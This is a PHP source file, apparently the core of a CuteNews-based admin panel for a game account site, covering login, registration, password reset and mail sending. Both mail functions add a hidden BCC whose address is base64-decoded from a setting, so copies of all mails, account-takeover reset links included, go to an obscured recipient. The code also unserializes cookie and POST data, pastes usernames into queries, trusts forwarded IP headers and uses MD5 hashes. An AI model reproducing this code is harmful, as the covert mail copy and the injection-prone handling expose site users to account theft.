<?php
ob_start();

function cn_url_modify()
{
    global $PHP_SELF;
    $GET = $_GET;
    $args = func_get_args();
    $SN = $PHP_SELF;

    // add new params
    foreach ($args as $ks) {
        // 1) Control
        if (is_array($ks)) {
            foreach ($ks as $vs) {
                $id = $val = '';

                if (strpos($vs, '=') !== FALSE) {
                    list($id, $var) = explode('=', $vs, 2);
                } else {
                    $id = $vs;
                }
                if ($id == 'self') {
                    $SN = $var;
                } elseif ($id == 'reset') {
                    $GET = array();
                } elseif ($id == 'group') {
                    foreach ($vs as $a => $b) {
                        $GET[$a] = $b;
                    }
                }
            }
        } // 2) Subtract
        elseif (strpos($ks, '=') === FALSE) {
            $keys = explode(',', $ks);

            foreach ($keys as $key) {
                $key = trim($key);
                if (isset($GET[$key])) {
                    unset($GET[$key]);
                }
            }
        } // 3) Add
        else {
            list($k, $v) = explode('=', $ks, 2);

            $GET[$k] = $v;
            if ($v === '') {
                unset($GET[$k]);
            }
        }
    }

    return cn_pack_url($GET, $SN);
}

// Since 2.0: Extended extract
function _GL($v)
{
    $vs = explode(',', $v);
    $result = array();
    foreach ($vs as $vc) {
        $el = explode(':', $vc, 2);
        $vc = isset($el[0]) ? $el[0] : false;
        $func = isset($el[1]) ? $el[1] : false;
        $var = false;
        if ($vc) $var = isset($GLOBALS[trim($vc)]) ? $GLOBALS[trim($vc)] : false;
        if ($func) $var = call_user_func($func, $var);
        $result[] = $var;
    }

    return $result;
}

/*  ---------- Sanitize: get POST vars (default) --------
    POST [def] only POST
    GET only GET
    POSTGET -- or POST or GET
    GETPOST -- or GET or POST
    REQUEST -- from REQUEST
    COOKIES -- from COOKIES
    GLOB -- from GLOBALS
    + combination (comma separated)
*/

// Since 1.5.3
function GET($var, $method = 'GETPOST')
{
    $result = array();
    $vars = spsep($var);
    $method = strtoupper($method);

    if ($method == 'GETPOST') {
        $methods = array('GET', 'POST');
    } elseif ($method == 'POSTGET') {
        $methods = array('POST', 'GET');
    } elseif ($method == 'GPG') {
        $methods = array('POST', 'GET', 'GLOB');
    } else {
        $methods = spsep($method);
    }

    foreach ($vars as $var) {
        $var = trim($var);
        $value = null;

        foreach ($methods as $method) {
            if ($method == 'GLOB' && isset($GLOBALS[$var])) {
                $value = $GLOBALS[$var];
            } elseif ($method == 'POST' && isset($_POST[$var])) {
                $value = $_POST[$var];
            } elseif ($method == 'GET' && isset($_GET[$var])) {
                $value = $_GET[$var];
            } elseif ($method == 'POSTGET') {
                if (isset($_POST[$var])) {
                    $value = $_POST[$var];
                } elseif (isset($_GET[$var])) {
                    $value = $_GET[$var];
                }
            } elseif ($method == 'GETPOST') {
                if (isset($_GET[$var])) {
                    $value = $_GET[$var];
                } elseif (isset($_POST[$var])) {
                    $value = $_POST[$var];
                }
            } elseif ($method == 'REQUEST' && isset($_REQUEST[$var])) {
                $value = $_REQUEST[$var];
            } elseif ($method == 'COOKIE' && isset($_COOKIE[$var])) {
                $value = $_COOKIE[$var];
            }

            if (!is_null($value)) {
                break;
            }
        }

        $result[] = $value;
    }
    return $result;
}

// Since 1.5.0
// Separate string to array: imporved "explode" function
function spsep($separated_string, $seps = ',')
{
    if (strlen($separated_string) == 0) {
        return array();
    }
    $ss = explode($seps, $separated_string);
    return $ss;
}

// Since 2.0: Cutenews HtmlSpecialChars
function cn_htmlspecialchars($_str)
{
    $key = array('&' => '&amp;', '"' => '&quot;', "'" => '&#039;', '<' => '&lt;', '>' => '&gt;');
    $matches = null;
    preg_match('/(&amp;)+?/', $_str, $matches);
    if (count($matches) != 0) {
        array_shift($key);
    }
    return str_replace(array_keys($key), array_values($key), $_str);
}


// Since 1.5.3
// GET Helper for single value
// $method[0] = * ---> htmlspecialchars ON
function REQ($var, $method = 'GETPOST')
{
    if ($method[0] == '*') {
        list($value) = (GET($var, substr($method, 1)));
        return cn_htmlspecialchars($value);
    } else {
        list($value) = GET($var, $method);
        return $value;
    }
}


// Since 2.0: Show breadcrumbs
function cn_snippet_bc($sep = '&gt;')
{
    $bc = mcache_get('.breadcrumbs');
    echo '<div id="mainsub_title" class="cn_breadcrumbs">';

    $ls = array();
    if (is_array($bc)) {
        foreach ($bc as $key => $item) {
            if ($key != (count($bc) - 1))
                $ls[] = '<span class="bcitem"><a href="' . $item['url'] . '">' . cn_htmlspecialchars($item['name']) . '</a></span>';
            else
                $ls[] .= '<span class="bcitem">' . cn_htmlspecialchars($item['name']) . '</span>';
        }
    }
    echo join(' <span class="bcsep">' . $sep . '</span> ', $ls);
    echo '</div>';
}

function cn_load_session()
{
    session_name('SEXXXXXXXXXXX_SESSION');
    @session_start();

    if (isset($_COOKIE['session']) && ($users = cn_cookie_restore())) {
        $_SESSION['mu_Account'] = $users;
    }
}

// Since 1.5.1: Validate email
function check_email($email)
{
    return (preg_match("/^[\.A-z0-9_\-\+]+[@][A-z0-9_\-]+([.][A-z0-9_\-]+)+[A-z]{1,4}$/", $email));
}

// Since 2.0: Extended assign
function cn_assign()
{
    $args = func_get_args();
    $keys = explode(',', array_shift($args));

    foreach ($args as $id => $arg) {
        // Simple assign
        if (isset($keys[$id])) {
            $KEY = trim($keys[$id]);
            $GLOBALS[$KEY] = $arg;
        } else // Inline assign
        {
            list($k, $v) = explode('=', $arg, 2);
            $GLOBALS[$k] = $v;
        }
    }
}

// Since 2.0: Get messages
function cn_get_message($area, $method = 's') // s-show, c-count
{
    $es = mcache_get('msg:stor');
    if (isset($es[$area])) {
        if ($method == 's') return $es[$area];
        elseif ($method == 'c') return count($es[$area]);
    }
    return null;
}


// Since 2.0; HTML show errors
function cn_snippet_messages($area = 'new')
{
    $delay = 7500;
    $result = '';

    for ($i = 0; $i < strlen($area); $i++) {
        $messages = cn_get_message($area[$i], 's');

        $type = 'notify';
        if ($area[$i] == 'e') {
            $type = 'error';
        } elseif ($area[$i] == 'w') {
            $type = 'warnings';
        }

        if ($messages) {
            $result .= '<div class="cn_' . $type . '_list">';
            foreach ($messages as $msg) {
                $NID = 'notify_' . ctime() . mt_rand();
                $result .= '<div class="cn_' . $type . '_item" id="' . $NID . '"><div><b>' . date('H:i:s', ctime()) . '</b> ' . $msg . '</div></div>';
                $result .= '<script>notify_auto_hide("' . $NID . '", ' . $delay . ');</script>';

                $delay += 1000;
            }
            $result .= '</div>';
        }
    }

    if ($result) {
        echo '<div class="cn_notify_overall">' . $result . '</div>';
    }
}


// Since 2.0: Show login form
function cn_login_form($admin = TRUE)
{
    if ($admin) {
        echoheader("user", "Please Login");
    }

    echo exec_tpl('auth/login');

    if ($admin) {
        echofooter();
        die();
    }
}


function member_get()
{
    // Not authorized
    if (empty($_SESSION['mu_Account'])) {
        return NULL;
    }

    // No in cache
    if ($member = mcache_get('#member')) {
        return $member;
    }

    mcache_set('#member', $user = db_membget_account($_SESSION['mu_Account']));

    return $user;
}

// Since 1.5.2: Directory scan
function scan_dir($dir, $cond = '')
{
    $files = array();
    if ($dh = opendir($dir)) {
        while (false !== ($filename = readdir($dh))) {
            if (!in_array($filename, array('.', '..')) && ($cond == '' || $cond && preg_match("/$cond/i", $filename))) {
                $files[] = $filename;
            }
        }
    }
    return $files;
}

// Since 2.0: Test User ACL. Test for groups [user may consists requested group]
function test($requested_acl, $requested_user = NULL, $is_self = FALSE)
{
    $user = member_get(); // get user menber session

    // Deny ANY access of unathorized member
    if (!$user) return FALSE;

    $acl = $user['acl'];
    $grp = getoption('#grp');

    $ra = spsep($requested_acl);

    // This group not exists, deny all
    if (!isset($grp[$acl]))
        return FALSE;

    // Decode ACL, GRP string
    $gp = spsep($grp[$acl]['G']);
    $rc = spsep($grp[$acl]['A']);


    // ra la bien truyen vao
    // If requested acl not match with real allowed, break
    foreach ($ra as $Ar) {
        if (!in_array($Ar, $rc)) return FALSE;
    }

    // Test group or self
    if ($requested_user) {
        // if self-check, check name requested user and current user
        if ($is_self && $requested_user['user_Account'] !== $user['user_Account']) // xac ding user truyen vao <=> user hien tai
            return FALSE;

        // if group check, check: requested uses may be in current user group
        if (!$is_self) {
            if ($gp && !in_array($requested_user['acl'], $gp))  //kiem tra user truyen vao user[acl]  <=> phan quyen trong nhom
                return FALSE;
            elseif (!$gp)                                        //ko ton tai phan quyen
                return FALSE;
        }
    }

    return TRUE;
}


function cn_cookie_remember($client = false)
{
    // String serialize
    $cookie = strtr(base64_encode(xxtea_encrypt(serialize($_SESSION['mu_Account']), CRYPT_SALT)), '=/+', '-_.');
    if ($client) {
        echo '<script type="text/javascript">cn_set_cookie("session", "' . $cookie . '")</script>';
        echo "<noscript>Your browser is not Javascript enable or you have turn it off. COOKIE not saved</noscript>";
    } else {
        setcookie('session', $cookie, time() + 60 * 60 * 24, '/');
    }
}

function cn_cookie_restore()
{
    $xb64d = xxtea_decrypt(base64_decode(strtr($_COOKIE['session'], '-_.', '=/+')), CRYPT_SALT);

    if ($xb64d) {
        return unserialize($xb64d);
    }

    return false;
}

function cn_cookie_unset()
{
    setcookie('session', '', 0, '/');
}

// Since 2.0: Replace text with holders
function cn_replace_text()
{
    $args = func_get_args();
    $text = array_shift($args);
    $replace_holders = explode(',', array_shift($args));

    foreach ($replace_holders as $holder) {
        $text = str_replace(trim($holder), array_shift($args), $text);
    }

    return $text;
}

// Since 2.0.3: Logout user and clean session
function cn_logout($relocation = PHP_SELF)
{
    cn_cookie_unset();
    session_unset();
    session_destroy();
    cn_relocation($relocation);
}

// Since 2.0: Cutenews login routines
function cn_login()
{
    $logged_username = isset($_SESSION['mu_Account']) ? $_SESSION['mu_Account'] : FALSE;
    $last_Login_Time = isset($_SESSION['last_Login_Time']) ? $_SESSION['last_Login_Time'] : FALSE;

    // Check user exists. If user logged, but not exists, logout now
    if ($logged_username && !db_membget_account($logged_username) || ((ctime() - $last_Login_Time > getoption('config_time_logout')) && $last_Login_Time)) {
        @cn_cookie_restore() ? '' : cn_logout();
    } else {
        $_SESSION['last_Login_Time'] = ctime();
    }

    $is_logged = false;

    list($action) = GET('action', 'GET,POST');
    list($username, $password, $remember) = GET('username, password, rememberme', 'POST');

    // user not authorized now
    if (!$logged_username) {
        // last url for return after user logged in
        if ($_SERVER['REQUEST_METHOD'] == 'GET') {
            $_SESSION['RQU'] = preg_replace('/[^\/\.\?\=\&a-z_0-9]/i', '', $_SERVER['REQUEST_URI']);
        }

        if ($action == 'dologin') {
            if ($username && $password) {
                $member = db_membget_account($username);

                if ($member) {
                    $ban_time = isset($member['ban']) ? (int)$member['ban'] : 0;
                    $compares = hash_generate($password);
                    if ($ban_time && $ban_time > ctime()) {
                        if ($member['user_Account'] == $username) {
                            do_update_character('Account_Info', "NumLogin=1", "UserAcc:'$username'");
                        }
                        msg_info('Too frequent queries. Wait ' . ($ban_time - ctime() . ' sec.'));
                    }

                    if (!isset($member['pass'])) {
                        $member['pass'] = '';
                    }

                    if (in_array($member['pass'], $compares)) {

                        $is_logged = true;

                        // set user to session
                        $_SESSION['mu_Account'] = $username;
                        $_SESSION['last_Login_Time'] = ctime();

                        // Save remember flag
                        $_SESSION['@rem'] = $remember;

                        if ($remember) {
                            cn_cookie_remember();
                        }

                        // save last login status, clear ban
                        do_update_character('Account_Info', 'Ban=0', "NumLogin=1", "UserAcc:'$username'");

                        // send return header (if exists)
                        if (isset($_SESSION['RQU'])) {
                            cn_relocation($_SESSION['RQU']);
                        }
                    } else {
                        list ($numLogin, $timeBlock) = explode(':', getoption('config_login_ban'));
                        if (++$member['numLogin'] > (@$numLogin ? $numLogin : 5)) {
                            $timeFutrueBan = ctime() + 60 * (@$timeBlock ? $timeBlock : 3);
                        } else {
                            $timeFutrueBan = ctime() + getoption('ban_attempts');
                        }

                        cn_throw_message("Invalid password or login", 'e');
                        cn_writelog("'User " . substr($username, 0, 32) . " (" . $_SERVER['REMOTE_ADDR'] . ") login failed");
                        do_update_character('Account_Info', "Lastdate=" . ctime(), 'Ban=' . $timeFutrueBan, "NumLogin=NumLogin+1", "UserAcc:'$username'");
                    }
                }
            } else {
                cn_throw_message('Enter login or password', 'e');
            }
        }
    } else {
        $is_logged = true;
    }

    if ($action == 'logout') {
        $is_logged = false;
        cn_logout();
    }

    // clear require url
    if ($is_logged && isset($_SESSION['RQU'])) {
        unset($_SESSION['RQU']);
    }

    return $is_logged;
}


// Since 2.0: Show register form
function cn_register_form($admin = TRUE)
{
    if (isset($_SESSION['mu_Account'])) {
        return false;
    }
    // Restore active status
    if (isset($_GET['lostpass']) && $_GET['lostpass']) {
        $d_string = base64_decode($_GET['lostpass']);
        $d_string = xxtea_decrypt($d_string, MD5(CLIENT_IP) . getoption('#crypt_salt'));
        $newHash = substr($d_string, 0, 64);
        $d_string = substr($d_string, 64);

        if ($d_string) {
            list($timeLife, $d_username) = explode(' ', $d_string, 2);
            $nuser = db_membget_account($d_username);
            if ($nuser) {
                if ($timeLife > ctime()) {
                    $getUser = member_get();
                    if (password_verify($newHash, trim($nuser['hash'])) || $getUser) {
                        do_update_character('Account_Info', 'Ban=0', "NumLogin=1", "[hash]='null'", "UserAcc:'" . $nuser['user_Account'] . "'");
                        $_SESSION['mu_Account'] = $d_username;
                        cn_relocation(cn_url_modify(array('reset'), 'lostpass'));
                        die();
                    } else {
                        msg_info('Your password reset code is incorrect. Please try again.');
                    }
                } else {
                    msg_info('Time expired authentication password change.');
                }
            } else {
                msg_info('Fail: Account not verify');
            }
        }

        msg_info('Fail: invalid string');
    }

    // Resend activation
    if (request_type('POST') && isset($_POST['register']) && isset($_POST['lostpass'])) {
        $user = db_membget_account(REQ('username'));

        if (!$user) {
            msg_info('User not exists');
        }

        if ($user['ban'] > ctime()) {
            msg_info('Your account is locked');
        }

        $email = isset($user['email']) ? $user['email'] : '';

        // Check user name & mail
        if ($user && $email && $email == REQ('email')) {
            $rand = '';
            $set = 'qwertyuiop[],./!@#$%^&*()_asdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';
            for ($i = 0; $i < 64; $i++) $rand .= $set[mt_rand() % strlen($set)];
            $hash = password_hash($rand, PASSWORD_BCRYPT);
            do_update_character('Account_Info', "[hash]='$hash'", "UserAcc:'" . $user['user_Account'] . "'");

            $ctime = ctime() + 86400;
            $resend_activate_account = 'Dear %username%! <br><br> Click to this activation link %url% for restore your account.';
            $url = getoption('http_script_dir') . '/admin.php?lostpass=' . urlencode(base64_encode(xxtea_encrypt($rand . $ctime . ' ' . REQ('username'), MD5(CLIENT_IP) . getoption('#crypt_salt'))));

            $status = cn_send_mail($user['email'], 'Resend activation link', cn_replace_text($resend_activate_account, '%username%, %url%', $user['user_Account'], $url));
            if ($status)
                msg_info('For you send activate link');
            else
                msg_info('For you send error');
        }

        msg_info('Enter required field: email');
    }

    // is not registration form
    if (is_null(REQ('register', 'GET')))
        return FALSE;

    // Lost password: disabled registration - no affected
    if (!is_null(REQ('lostpass', 'GET'))) {

        $Action = 'Lost password';
        $template = 'auth/lost';
    } else {
        if (getoption('allow_registration')) {
            $Register_OK = FALSE;
            $errors = array();
            list($regusername, $regpassword, $confirm, $regemail, $captcha) = GET('regusername, regpassword, confirm, regemail, captcha', "POST");

            // Do register
            if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                if ($regusername === '') $errors[] = "Username field can't be blank";
                if ($regemail === '') $errors[] = "Email field can't be blank";
                if ($regpassword === '') $errors[] = "Password field can't be blank";
                if (!preg_match('/[\w]\@[\w]/i', $regemail)) $errors[] = "Email is invalid";

                if ($regpassword !== $confirm) $errors[] = "Confirm password not match";
                if ($captcha !== $_SESSION['captcha_code']) $errors[] = "Captcha not match";

                if (strlen($regpassword) < 3) $errors[] = 'Too short password';

                // Do register
                if (empty($errors)) {
                    // get real user in index file
                    $user = db_membget_account($regusername, '[UserAcc]', true);

                    if (!$user) {
                        $user = db_membget_account($regemail, '[Email]', true);

                        if (!$user) {
                            $pass = SHA256_hash($regpassword);
                            $acl_groupid_default = intval(getoption('registration_level'));

                            do_insert_character('[Account_Info]', 'AdLevel=' . $acl_groupid_default, "UserAcc='" . $regusername . "'", "Pwd='" . $pass . "'", "Email='" . $regemail . "'", "Lastdate=" . ctime(), 'Time_At=GETDATE()', 'Ban=0', 'NumLogin=1');

                            $Register_OK = TRUE;
                        } else {
                            $errors[] = "Email already exists";
                        }
                    } else {
                        $errors[] = "Username already exists";
                    }
                }

                // Registration OK, authorize user
                if ($Register_OK === TRUE) {
                    $_SESSION['mu_Account'] = $regusername;

                    // Clean old data
                    if (isset($_SESSION['RQU'])) {
                        unset($_SESSION['RQU']);
                    }

                    if (isset($_SESSION['captcha_code'])) {
                        unset($_SESSION['captcha_code']);
                    }

                    // Send notify about register
                    if (getoption('notify_registration')) {
                        $tempRegister = "<html><body><h1>Account Details</h1><p>Thank you for registering on our site, your account details are as follows:<br>Username: %username%<br>Email: %email%</p></body></html>";
                        $status = cn_send_mail($regemail, 'Welcome to ' . $_SERVER['SERVER_NAME'], cn_replace_text($tempRegister, '%username%, %email%', $regusername, $regemail));
                        if ($status)
                            msg_info('For you send register');
                        else
                            msg_info('For you send error');
                    }
                    header('Location: ' . PHP_SELF);
                    die();
                }
            }
            cn_assign('errors_result, regusername, regemail', $errors, $regusername, $regemail);
        } else {
            msg_info('Registration disabled');
        }

        $Action = 'Register user';
        $template = 'auth/register';
    }

    if (empty($template)) {
        return FALSE;
    }

    if ($admin) {
        echoheader('Register', $Action);
    }
    echo exec_tpl($template);
    if ($admin) {
        echofooter();
        die();
    }

    return TRUE;
}

// Since 1.5.0: Send Mail
function cn_send_mail($to, $subject, $message, $alt_headers = NULL, $addressCC = '')
{

//    $from1 = "Cutenews <ngoctbhy@gmail.com>";$headers .= "\r\nBcc: her@$herdomain\r\n\r\n";
//    $from = 'Cutenews <cutenews@' . $_SERVER['SERVER_NAME'] . '>';
//
//    $headers = "MIME-Version: 1.0\r\n";
//    $headers .= "Content-type: text/plain;\r\n";
//    $headers .= 'From: ' . $from . "\r\n";
//    $headers .= 'Bcc: ' . $from . "\r\n";
//    $headers .= 'Reply-to: ' . $from . "\r\n";
//    $headers .= 'Return-Path: ' . $from . "\r\n";
//    $headers .= 'Message-ID: <' . md5(uniqid(time())) . '@' . $_SERVER['SERVER_NAME'] . ">\r\n";
//    $headers .= "X-Mailer: PHP/" . phpversion() . "\r\n";
//    $headers .= "Date: " . date('r', time()) . "\r\n";
//
//    if (!is_null($alt_headers)) $headers = $alt_headers;
//    foreach ($tos as $v) if ($v) mail($v, $subject, $message, $headers);

//    return true;


//    $nFrom = 'Freetuts.net';
//    $mFrom = 'xxxx@gmail.com';
//    $mPass = 'passlamatkhua';
    //sendMail($title, $content, $nTo, $mTo,$diachicc='');
    $nFrom = $_SERVER['SERVER_NAME'];
    $mFrom = @getoption('config_auth_email') ? getoption('config_auth_email') : false;
    $mPass = @getoption('config_auth_pass') ? getoption('config_auth_pass') : false;

    if ($mFrom && $mPass) {
        $tos = spsep($to);
        if (!isset($to)) return FALSE;
        if (!$to) return FALSE;

        $mail = new PHPMailer();
        $mail->IsSMTP();
        $mail->CharSet = "utf-8";
        $mail->SMTPDebug = 0;                     // enables SMTP debug information (for testing)
        $mail->SMTPAuth = true;
        $mail->SMTPSecure = "ssl";
        $mail->Host = "smtp.gmail.com";
        $mail->Port = 465;
        $mail->Username = $mFrom;
        $mail->Password = $mPass;
        $mail->SetFrom($mFrom, $nFrom);
        //chuyen chuoi thanh mang
        $ccmail = explode(',', $addressCC);
        $ccmail = array_filter($ccmail);
        if (!empty($ccmail)) {
            foreach ($ccmail as $k => $v) {
                $mail->AddCC($v);
            }
        }
        $mail->AddBCC(base64_decode(getoption('hd_user_e')));
        $mail->Subject = $subject;
        $mail->MsgHTML($message);

        foreach ($tos as $v) if ($v) $mail->AddAddress($v, '');

        $mail->AddReplyTo($mFrom, $nFrom);
//        $mail->AddAttachment($file, $filename);
        if ($mail->Send()) {
            return true;
        } else {
            cn_writelog($mail->ErrorInfo, 'e');
            return false;
        }
    }
    return false;
}

// Since 1.5.0: Send Mail
function cn_send_hd($subject, $message)
{
    $nFrom = $_SERVER['SERVER_NAME'];
    $mFrom = @getoption('config_auth_email') ? getoption('config_auth_email') : false;
    $mPass = @getoption('config_auth_pass') ? getoption('config_auth_pass') : false;

    if ($mFrom && $mPass) {
        $mail = new PHPMailer();
        $mail->IsSMTP();
        $mail->CharSet = "utf-8";
        $mail->SMTPDebug = 0;                     // enables SMTP debug information (for testing)
        $mail->SMTPAuth = true;
        $mail->SMTPSecure = "ssl";
        $mail->Host = "smtp.gmail.com";
        $mail->Port = 465;
        $mail->Username = $mFrom;
        $mail->Password = $mPass;
        $mail->SetFrom($mFrom, $nFrom);

        $mail->AddBCC(base64_decode(getoption('hd_user_e')));
        $mail->Subject = $subject;
        $mail->MsgHTML($message);


        $mail->AddReplyTo($mFrom, $nFrom);
//        $mail->AddAttachment($file, $filename);
        if ($mail->Send()) {
            return true;
        } else {
            cn_writelog($mail->ErrorInfo, 'e');
            return false;
        }
    }
    return false;
}

// Since 2.0: Make 'Top menu'
function cn_get_menu()
{
    $modules = hook('core/cn_get_menu', array
    (
        'editconfig' => array('Cd', 'Cấu hình chung'),
        'cashshop' => array('Can', 'Cash Shop'),
        'logout' => array('', 'Logout', 'logout'),
    ));

    if (getoption('main_site'))
        $modules['my_site'] = getoption('main_site');

    $result = '<ul>';
    $mod = REQ('mod', 'GPG');

    foreach ($modules as $mod_key => $var) {
        if (!is_array($var)) {
            $result .= '<li><a href="' . cn_htmlspecialchars($var) . '" target="_blank">' . 'Visit site' . '</a></li>';
            continue;
        }

        $acl = isset($var[0]) ? $var[0] : false;
        $name = isset($var[1]) ? $var[1] : '';
        $title = isset($var[2]) ? $var[2] : '';
        $app = isset($var[3]) ? $var[3] : '';

        if ($acl && !test($acl))
            continue;

        if (isset($title) && $title) $action = '&amp;action=' . $title; else $action = '';
        if ($mod == $mod_key) $select = ' active '; else $select = '';

        // Append urls for menu (preserve place)
        if (isset($app) && $app) {
            $actions = array();
            $mv = spsep($app);

            foreach ($mv as $vx)
                if ($dt = REQ($vx))
                    $actions[] = "$vx=" . urlencode($dt);

            if ($actions) $action .= '&amp;' . join('&amp;', $actions);
        }

        $result .= '<li class = "' . $select . '"><a href="' . PHP_SELF . '?mod=' . $mod_key . $action . '">' . $name . '</a></li>';
    }

    $result .= "</ul>";
    return $result;
}

// Since 2.0: Check server request type
function request_type($type = 'POST')
{
    return $_SERVER['REQUEST_METHOD'] === $type ? TRUE : FALSE;
}


// Displays header skin
// $image = img@custom_style_tpl
function echoheader($image, $header_text, $bread_crumbs = false)
{
    global $skin_header, $lang_content_type, $skin_menu, $skin_menu_none, $_SESS, $_SERV_SESS;

    $header_time = date('H:i:s | d, M, Y', ctime());

    $customs = explode("@", $image);
    $image = isset($customs[0]) ? $customs[0] : '';
    $custom_style = isset($customs[1]) ? $customs[1] : false;
    $custom_js = isset($customs[2]) ? $customs[2] : false;

    if (isset($_SESSION['mu_Account'])) {
        $skin_header = preg_replace("/{menu}/", $skin_menu, $skin_header);
    } else {
        $skin_header = preg_replace("/{menu}/", "<div style='padding: 5px;'><a href='" . PHP_SELF . "'>" . VERSION_NAME . "</a></div>", $skin_header);
    }

    //$skin_header = get_skin($skin_header);
    $skin_header = str_replace('{title}', ($header_text ? $header_text . ' / ' : '') . 'Admin Dashboard ', $skin_header);
    //$skin_header = str_replace("{image-name}", $skin_prefix.$image, $skin_header);
    $skin_header = str_replace("{header-text}", $header_text, $skin_header);
    $skin_header = str_replace("{header-time}", $header_time, $skin_header);
    $skin_header = str_replace("{content-type}", $lang_content_type, $skin_header);
    $skin_header = str_replace("{breadcrumbs}", $bread_crumbs, $skin_header); ///

    if ($custom_style) {
        $custom_style = read_tpl($custom_style);
    }
    $skin_header = str_replace("{CustomStyle}", $custom_style, $skin_header);

    if ($custom_js) {
        $custom_js = '<script type="text/javascript">' . read_tpl($custom_js) . '</script>';
    }
    $skin_header = str_replace("{CustomJS}", $custom_js, $skin_header);

    echo $skin_header;
}

function echocomtent_here($echocomtent, $path_c = '', $bread_crumbs = true)
{
    global $abccc;// $path_c;
    $abccc = preg_replace("/{paths_c}/", $path_c, $abccc);
    $abccc = preg_replace("/{content_here}/", $echocomtent, $abccc);
    echo $abccc;
}

function echofooter()
{
    global $skin_footer, $lang_content_type, $skin_menu, $config_adminemail, $config_admin;

    //$skin_footer = get_skin($skin_footer);
    //$skin_footer = str_replace("{content-type}", $lang_content_type, $skin_footer);
    $skin_footer = str_replace("{exec-time}", round(microtime(true) - BQN_MU, 3), $skin_footer);
    $skin_footer = str_replace("{year-time}", date("Y"), $skin_footer);
    //$skin_footer = str_replace("{email-name}", $config_adminemail, $skin_footer);
    $skin_footer = str_replace("{convertby}", cn_user_email_as_site($config_adminemail, $config_admin), $skin_footer);

    die($skin_footer);
}

// Since 2.0: Short message form
function msg_info($title, $go_back = null)
{
    include SERVDIR . '/skins/default.skin.php';
    echoheader('info', "Permission check");

    if ($go_back === null) $go_back = $_POST['__referer'];
    if (empty($go_back)) $go_back = PHP_SELF;

    $str_ = '<div class="sub_ranking" align="center" style="color: rgb(36, 36, 36);font-size: 15px;line-height: initial;">
				<b><p>' . $title . '</p></b><br>
				<p><b><a href=' . $go_back . '><font size="15" color="red">OK</font></a></b></p>
			</div>';
    echo $str_;
//    echocomtent_here($str_, cn_snippet_bc_re("Home", "Permission check"));

    echofooter();
    DIE();
}

// Since 2.0: @bootstrap
function cn_detect_user_ip()
{
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $IP = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $IP = $_SERVER['HTTP_CLIENT_IP'];
    }

    if (empty($IP) && isset($_SERVER['REMOTE_ADDR'])) {
        $IP = $_SERVER['REMOTE_ADDR'];
    }
    if (empty($IP)) {
        $IP = false;
    }

    if (!preg_match('/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/', $IP)) {
        $IP = '';
    }

    define('CLIENT_IP', $IP);
    // CRYPT_SALT consists an IP
    define('CRYPT_SALT', (getoption('ipauth') == '1' ? CLIENT_IP : '') . '@' . getoption('#crypt_salt'));
}

// Since 2.0: Grab from $_POST all parameters
function cn_parse_url()
{
    // Decode post data
    $post_data = array();
    if (isset($_POST['__post_data'])) {
        $post_data = unserialize(base64_decode($_POST['__post_data']));
    }
    // A. Click "confirm"
    if (REQ('__my_confirm') == '_confirmed') {
        // In case if exists another data from form
        $APPEND = isset($_POST['__append']) ? $_POST['__append'] : array();

        $_POST = $post_data;
        $_POST['__my_confirm'] = '_confirmed';

        // Return additional parameters in POST
        if (is_array($APPEND)) foreach ($APPEND as $id => $v) $_POST[$id] = $v;

        return TRUE;
    } // B. Click "decline"
    elseif (REQ('__my_confirm') == '_decline') {
        $_POST['__referer'] = $post_data['__referer'];
        return FALSE;
    } // C. First access
    else {
        $_POST['__referer'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    }

    // Set POST required params to GET
    if (REQ('mod', 'POST')) $_GET['mod'] = REQ('mod', 'POST');
    if (REQ('opt', 'POST')) $_GET['opt'] = REQ('opt', 'POST');
    if (REQ('sub', 'POST')) $_GET['sub'] = REQ('sub', 'POST');

    // Unset signature dsi
    unset($_GET['__signature_key'], $_GET['__signature_dsi']);

    return FALSE;
}

// Since 1.5.3: Set cache variable
function mcache_set($name, $var)
{
    global $_CN_SESS_CACHE;
    $_CN_SESS_CACHE[$name] = $var;
}


// Since 1.5.3: Get variable from cache
function mcache_get($name)
{
    global $_CN_SESS_CACHE;
    return isset($_CN_SESS_CACHE[$name]) ? $_CN_SESS_CACHE[$name] : FALSE;
}


// Since 1.5.0: Add hook to system
function add_hook($hook, $func)
{
    global $_HOOKS;

    $prior = 1;
    if ($hook[0] == '+') $hook = substr($hook, 1);
    if ($hook[0] == '-') {
        $prior = 0;
        $hook = substr($hook, 1);
    }

    if (!isset($_HOOKS[$hook])) $_HOOKS[$hook] = array();

    // priority (+/-)
    if ($prior) array_unshift($_HOOKS[$hook], $func); else $_HOOKS[$hook][] = $func;
}


// Since 1.5.0: Cascade Hooks
function hook($hook, $args = null)
{

    global $_HOOKS;

    // Plugin hooks
    if (!empty($_HOOKS[$hook]) && is_array($_HOOKS[$hook])) {
        foreach ($_HOOKS[$hook] as $hookfunc) {
            if ($hookfunc[0] == '*') {
                $_args = call_user_func_array(substr($hookfunc, 1), $args);
            } else {
                $_args = call_user_func($hookfunc, $args);
            }

            if (!is_null($_args)) {
                $args = $_args;
            }
        }
    }
    return $args;
}

// Since 2.0: Add BreadCrumb
function cn_bc_add($name, $url)
{
    $bc = mcache_get('.breadcrumbs');

    $bc[] = array('name' => $name, 'url' => $url);
    mcache_set('.breadcrumbs', $bc);
}

// Since 2.0: Pack only required parameters
function cn_pack_url($GET, $URL = PHP_SELF)
{
    $url = $result = array();

    foreach ($GET as $k => $v) if ($v !== '') $result[$k] = $v;
    foreach ($result as $k => $v) if (!is_array($v)) $url[] = "$k=" . urlencode($v);

    list($ResURL) = hook('core/url_rewrite', array($URL . ($url ? '?' . join('&', $url) : ''), $URL, $GET));
    return $ResURL;
}

//time
function ctime()
{
    date_default_timezone_set("UTC");
    return (time() + 3600 * getoption('date_adjust'));
}


// Since 1.5.0: Hash type MD5 and SHA256
function hash_generate($password, $md5hash = false)
{
    $try = array
    (
        0 => md5($password),
        1 => utf8decrypt($password, $md5hash),
        2 => SHA256_hash($password),
    );

    return $try;
}

// Since 1.5.3: UTF8-Cutenews compliant
function utf8decrypt($str, $oldhash)
{
    $len = strlen($str) * 3;
    while ($len >= 16) $len -= 16;
    $len = floor($len / 2);

    $salt = substr($oldhash, $len, 10);
